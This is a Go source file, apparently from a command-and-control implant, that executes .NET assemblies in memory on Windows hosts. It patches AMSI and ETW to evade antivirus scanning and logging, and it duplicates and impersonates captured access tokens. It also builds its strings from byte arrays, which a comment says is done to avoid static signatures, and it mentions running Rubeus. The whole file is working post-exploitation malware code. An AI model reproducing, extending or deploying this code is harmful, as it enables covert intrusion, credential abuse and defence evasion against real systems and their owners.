// server/docker/payloads/Windows/action_inline_assembly_async.go
//go:build windows
// +build windows

package main

import (
	"bytes"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	clr "github.com/almounah/go-buena-clr"
)

const (
	// These should match the constants in action_inline_assembly.go
	STD_OUTPUT_HANDLE_ASYNC    = uintptr(^uint(11 - 1)) // -11 as uintptr
	STD_ERROR_HANDLE_ASYNC     = uintptr(^uint(12 - 1)) // -12 as uintptr
	COINIT_MULTITHREADED_ASYNC = 0x0
)

// Inline assembly async strings (constructed to avoid static signatures)
var (
	// Output markers
	iaaOutputStart = string([]byte{0x0a, 0x3e, 0x3e, 0x3e, 0x0a})       // \n>>>\n
	iaaOutputEnd   = string([]byte{0x0a, 0x3c, 0x3c, 0x3c, 0x0a})       // \n<<<\n

	// CLR version strings
	iaaClrV4       = string([]byte{0x76, 0x34})                                                                   // v4
	iaaClrV2       = string([]byte{0x76, 0x32})                                                                   // v2
	iaaClrV2Sig    = string([]byte{0x76, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37})                   // v2.0.50727

	// Runfor detection
	iaaRunforFlag  = string([]byte{0x2f, 0x72, 0x75, 0x6e, 0x66, 0x6f, 0x72})       // /runfor
	iaaColon       = string([]byte{0x3a})                                           // :

	// Status messages
	iaaDoneMsg       = string([]byte{0x0a, 0x44, 0x6f, 0x6e, 0x65, 0x0a})           // \nDone\n

	// Error detection keywords
	iaaKwExit      = string([]byte{0x65, 0x78, 0x69, 0x74})                         // exit
	iaaKwTerminate = string([]byte{0x74, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65}) // terminate

	// CLR corruption
	iaaClrErrCode  = string([]byte{0x30, 0x78, 0x38, 0x30, 0x31, 0x33, 0x31, 0x36, 0x30, 0x34})   // 0x80131604
)

// AssemblyTokenContext stores token information for assembly execution
type AssemblyTokenContext struct {
	IsImpersonating bool
	ActiveToken     string
	NetOnlyToken    string
	NetOnlyHandle   syscall.Handle
}

// captureCurrentAssemblyTokenContext captures the current token context for async execution
func captureCurrentAssemblyTokenContext() *AssemblyTokenContext {
	if globalTokenStore == nil {
		return nil
	}

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	return &AssemblyTokenContext{
		IsImpersonating: globalTokenStore.IsImpersonating,
		ActiveToken:     globalTokenStore.ActiveToken,
		NetOnlyToken:    globalTokenStore.NetOnlyToken,
		NetOnlyHandle:   globalTokenStore.NetOnlyHandle,
	}
}

// applyAssemblyTokenContextWithDuplication applies the stored token context using token duplication
func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext) (func(), syscall.Handle) {
	if tokenContext == nil || globalTokenStore == nil {
		return func() {}, 0
	}

	var cleanupFunc func()
	var duplicatedToken syscall.Handle

	// Priority: Network-only token > Regular impersonation
	if tokenContext.NetOnlyHandle != 0 {

		// First verify the source handle is still valid
		globalTokenStore.mu.RLock()
		currentNetOnlyHandle := globalTokenStore.NetOnlyHandle
		globalTokenStore.mu.RUnlock()

		if currentNetOnlyHandle == 0 {
			return func() {}, 0
		}

		// Duplicate the token for this specific async operation
		err := DuplicateTokenEx(
			currentNetOnlyHandle,
			TOKEN_ALL_ACCESS,
			nil,
			SecurityImpersonation,
			TokenImpersonation,
			&duplicatedToken,
		)

		if err != nil {

			// Try with different access rights
			err2 := DuplicateTokenEx(
				currentNetOnlyHandle,
				TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY,
				nil,
				SecurityImpersonation,
				TokenImpersonation,
				&duplicatedToken,
			)

			if err2 != nil {
				// As last resort, use the original handle
				duplicatedToken = currentNetOnlyHandle
				cleanupFunc = func() {
				}
			} else {
				cleanupFunc = func() {
					CloseHandle(duplicatedToken)
				}
			}
		} else {
			cleanupFunc = func() {
				CloseHandle(duplicatedToken)
			}
		}

		return cleanupFunc, duplicatedToken

	} else if tokenContext.IsImpersonating && tokenContext.ActiveToken != "" {
		// Look up the token in the global store
		globalTokenStore.mu.RLock()
		token, exists := globalTokenStore.Tokens[tokenContext.ActiveToken]
		globalTokenStore.mu.RUnlock()

		if exists {

			// Duplicate the token for this specific async operation
			err := DuplicateTokenEx(
				token,
				TOKEN_ALL_ACCESS,
				nil,
				SecurityImpersonation,
				TokenImpersonation,
				&duplicatedToken,
			)

			if err != nil {
				// Fall back to using the original handle
				duplicatedToken = token
				cleanupFunc = func() {
				}
			} else {
				cleanupFunc = func() {
					CloseHandle(duplicatedToken)
				}
			}

			return cleanupFunc, duplicatedToken
		}
	}

	return func() {}, 0
}

// executeWindowsAssemblyAsync executes assembly asynchronously with protection against exit
func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes []byte, config struct {
	AssemblyB64 string   `json:"assembly_b64"`
	Arguments   []string `json:"arguments"`
	AppDomain   string   `json:"app_domain"`
	BypassAMSI  bool     `json:"bypass_amsi"`
	BypassETW   bool     `json:"bypass_etw"`
	RevertETW   bool     `json:"revert_etw"`
	EntryPoint  string   `json:"entry_point"`
	UsePipe     bool     `json:"use_pipe"`
	PipeName    string   `json:"pipe_name"`
}, job *AssemblyJob, tokenContext *AssemblyTokenContext) (int, error) {
	job.Output.WriteString(iaaOutputStart)

	// Ensure exit prevention is initialized
	InitializeExitPrevention()

	// Track execution count
	clrExecutionMutex.Lock()
	clrExecutionCount++
	executionNumber := clrExecutionCount
	clrExecutionMutex.Unlock()

	// Check if this looks like Rubeus with /runfor
	hasRunfor := false
	runforDuration := 30 // default seconds
	for _, arg := range config.Arguments {
		argLower := strings.ToLower(arg)
		if strings.Contains(argLower, iaaRunforFlag) {
			hasRunfor = true
			// Try to extract the duration
			if strings.Contains(argLower, iaaColon) {
				parts := strings.Split(argLower, iaaColon)
				if len(parts) > 1 {
					// Parse the number after the colon
					var duration int
					fmt.Sscanf(parts[1], "%d", &duration)
					if duration > 0 {
						runforDuration = duration
					}
				}
			}
			break
		}
	}

	// Write initial header to job output
	job.OutputMutex.Lock()

	// Detect assembly type
	isDLL := c.isDLLAssembly(assemblyBytes)
	_ = isDLL // assemblyType detection - used for bypass selection

	// Removed verbose output to reduce binary signatures
	// Only apply bypasses silently
	if config.BypassAMSI {
		patchAMSI()
	}

	if config.BypassETW {
		patchETW()
	}
	job.OutputMutex.Unlock()

	// Execute with protection and appropriate timeout
	return c.executeWithAsyncPipeCapture(assemblyBytes, config.Arguments, job, executionNumber, hasRunfor, runforDuration, tokenContext)
}

// executeWithAsyncPipeCapture captures output with protection against exit and token context
func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes []byte, arguments []string, job *AssemblyJob, executionNumber int, hasRunfor bool, runforDuration int, tokenContext *AssemblyTokenContext) (int, error) {

	type execResult struct {
		code int
		err  error
	}

	resultChan := make(chan execResult, 1)

	// Calculate timeout - add buffer time for runfor scenarios
	executionTimeout := 24 * time.Hour // Default very long timeout
	if hasRunfor {
		// Add 10 seconds buffer to the runfor duration
		executionTimeout = time.Duration(runforDuration+10) * time.Second
	}

	// Run the entire execution in a goroutine
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		defer func() {
			// Recover from any panic/exit attempt
			if r := recover(); r != nil {
				job.OutputMutex.Lock()
				job.Output.WriteString(iaaDoneMsg)
				job.OutputMutex.Unlock()
				resultChan <- execResult{0, nil} // Treat as success
			}
		}()

		// Apply token context if provided
		var cleanupToken func()
		var duplicatedTokenHandle syscall.Handle

		if tokenContext != nil {
			cleanupToken, duplicatedTokenHandle = applyAssemblyTokenContextWithDuplication(tokenContext)
			defer cleanupToken()

			if duplicatedTokenHandle != 0 {
				// Apply impersonation for this thread
				err := ImpersonateLoggedOnUser(duplicatedTokenHandle)
				if err != nil {
				} else {
					// Ensure we revert after execution
					defer func() {
						RevertToSelf()
					}()
				}
			}
		}

		// Initialize COM in this thread
		hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED_ASYNC)
		if hr == 0 {
			defer coUninitialize.Call()
		}

		// Create pipe for output capture
		var readPipe, writePipe syscall.Handle
		var sa syscall.SecurityAttributes
		sa.Length = uint32(unsafe.Sizeof(sa))
		sa.InheritHandle = 1

		err := syscall.CreatePipe(&readPipe, &writePipe, &sa, 1024*1024) // 1MB buffer
		if err != nil {
			// Execute without capture but with protection
			retCode, err := c.executeProtectedDirect(assemblyBytes, arguments, hasRunfor, runforDuration, duplicatedTokenHandle)
			resultChan <- execResult{retCode, err}
			return
		}
		defer syscall.CloseHandle(readPipe)

		// Save original handles
		origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE_ASYNC)
		origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE_ASYNC)

		// Check/create console
		consoleCreated := false
		if wnd, _, _ := getConsoleWindow.Call(); wnd == 0 {
			if ret, _, _ := allocConsole.Call(); ret != 0 {
				consoleCreated = true
			}
		}

		// Redirect stdout/stderr to our pipe
		setStdHandle.Call(STD_OUTPUT_HANDLE_ASYNC, uintptr(writePipe))
		setStdHandle.Call(STD_ERROR_HANDLE_ASYNC, uintptr(writePipe))

		// Start reader goroutine
		stopReader := make(chan struct{})
		readerDone := make(chan struct{})

		go func() {
			defer close(readerDone)
			buffer := make([]byte, 4096)
			totalRead := 0

			for {
				select {
				case <-stopReader:
					return
				default:
					var bytesRead uint32
					ret, _, _ := readFile.Call(
						uintptr(readPipe),
						uintptr(unsafe.Pointer(&buffer[0])),
						uintptr(len(buffer)),
						uintptr(unsafe.Pointer(&bytesRead)),
						0,
					)

					if ret != 0 && bytesRead > 0 {
						totalRead += int(bytesRead)
						output := string(buffer[:bytesRead])

						// Write to job output
						job.OutputMutex.Lock()
						job.Output.WriteString(output)
						job.OutputMutex.Unlock()

					} else {
						// No data available, wait a bit
						time.Sleep(50 * time.Millisecond)
					}
				}
			}
		}()

		// Execute the assembly with protection

		// Detect runtime version
		targetRuntime := iaaClrV4
		if bytes.Contains(assemblyBytes, []byte(iaaClrV2Sig)) {
			targetRuntime = iaaClrV2
		}

		// Execute with panic protection
		var retCode int32
		var execErr error

		execDone := make(chan bool)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					// Check if it's an expected exit (like from /runfor)
					if hasRunfor {
						job.OutputMutex.Lock()
						job.Output.WriteString(iaaDoneMsg)
						job.OutputMutex.Unlock()
					}
					execErr = nil // Not an error, just normal termination
					retCode = 0
				}
				execDone <- true
			}()

			// ADD IMPERSONATION HERE, in the same goroutine as the assembly execution
			if duplicatedTokenHandle != 0 {
				err := ImpersonateLoggedOnUser(duplicatedTokenHandle)
				if err != nil {
				} else {
					defer RevertToSelf()
				}
			}

			retCode, execErr = clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
		}()

		// Wait for execution with appropriate timeout
		select {
		case <-execDone:
		case <-time.After(executionTimeout):
			job.OutputMutex.Lock()
			if hasRunfor {
				job.Output.WriteString(iaaDoneMsg)
			} else {
				job.Output.WriteString("\n" + Err(E9) + "\n")
			}
			job.OutputMutex.Unlock()
			retCode = 0
			execErr = nil
		}

		// Close write pipe to signal EOF
		syscall.CloseHandle(writePipe)

		// Signal reader to stop and wait briefly for final output
		close(stopReader)
		select {
		case <-readerDone:
		case <-time.After(2 * time.Second):
		}

		// Restore handles
		setStdHandle.Call(STD_OUTPUT_HANDLE_ASYNC, origStdout)
		setStdHandle.Call(STD_ERROR_HANDLE_ASYNC, origStderr)

		// Clean up console if we created it
		if consoleCreated {
			freeConsole.Call()
		}

		// Check for specific exit-related errors
		if execErr != nil {
			errStr := strings.ToLower(execErr.Error())
			if strings.Contains(errStr, iaaKwExit) || strings.Contains(errStr, iaaKwTerminate) {
				job.OutputMutex.Lock()
				job.Output.WriteString(iaaDoneMsg)
				job.OutputMutex.Unlock()
				execErr = nil
				retCode = 0
			} else if strings.Contains(execErr.Error(), iaaClrErrCode) {
				job.OutputMutex.Lock()
				job.Output.WriteString("\n" + Err(E52) + "\n")
				job.OutputMutex.Unlock()
			}
		}

		// If no output was captured but assembly ran successfully, add a note
		job.OutputMutex.Lock()
		outputLen := job.Output.Len()
		if outputLen == 0 && execErr == nil {
			job.Output.WriteString(Succ(S18) + "\n")
		}
		// fmt.Printf("[DEBUG ASYNC] Final output buffer size: %d bytes\n", job.Output.Len())
		job.OutputMutex.Unlock()

		// Send result back
		resultChan <- execResult{int(retCode), execErr}
		job.Output.WriteString(iaaOutputEnd)
	}()

	// Wait for execution to complete or cancellation
	select {
	case result := <-resultChan:
		return result.code, result.err

	case <-job.CancelChan:
		// Job was cancelled
		job.OutputMutex.Lock()
		job.Output.WriteString("\n" + Err(E52) + "\n")
		job.OutputMutex.Unlock()
		return -1, fmt.Errorf(Err(E52))

	case <-time.After(executionTimeout + 30*time.Second): // Add extra buffer
		job.OutputMutex.Lock()
		job.Output.WriteString("\n" + Err(E9) + "\n")
		job.OutputMutex.Unlock()
		return -1, fmt.Errorf(Err(E9))
	}
}

// executeProtectedDirect executes without pipe capture but with exit protection and token
func (c *InlineAssemblyAsyncCommand) executeProtectedDirect(assemblyBytes []byte, arguments []string, hasRunfor bool, runforDuration int, tokenHandle syscall.Handle) (int, error) {
	targetRuntime := iaaClrV4
	if bytes.Contains(assemblyBytes, []byte(iaaClrV2Sig)) {
		targetRuntime = iaaClrV2
	}

	var retCode int32
	var execErr error

	// Set up timeout
	timeout := 24 * time.Hour
	if hasRunfor {
		timeout = time.Duration(runforDuration+10) * time.Second
	}

	done := make(chan bool)

	go func() {
		defer func() {
			if r := recover(); r != nil {
				execErr = nil
				retCode = 0
			}
			done <- true
		}()

		// Apply token impersonation if we have a handle
		if tokenHandle != 0 {
			err := ImpersonateLoggedOnUser(tokenHandle)
			if err == nil {
				defer RevertToSelf()
			}
		}

		retCode, execErr = clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
	}()

	select {
	case <-done:
		// Completed
	case <-time.After(timeout):
		// Timeout - treat as successful completion for /runfor
		if hasRunfor {
			return 0, nil
		}
		return -1, fmt.Errorf(Err(E9))
	}

	return int(retCode), execErr
}

// isDLLAssembly checks if the assembly is a DLL
func (c *InlineAssemblyAsyncCommand) isDLLAssembly(assemblyBytes []byte) bool {
	// Check PE headers to determine if it's a DLL
	if len(assemblyBytes) < 0x3C+4 {
		return false
	}

	// Check for MZ header
	if assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
		return false
	}

	// Get PE header offset
	peOffset := int32(assemblyBytes[0x3C]) |
		int32(assemblyBytes[0x3D])<<8 |
		int32(assemblyBytes[0x3E])<<16 |
		int32(assemblyBytes[0x3F])<<24

	if int(peOffset+0x17) >= len(assemblyBytes) {
		return false
	}

	// Check characteristics for DLL flag (0x2000)
	characteristics := uint16(assemblyBytes[peOffset+0x16]) | uint16(assemblyBytes[peOffset+0x17])<<8
	return (characteristics & 0x2000) != 0
}
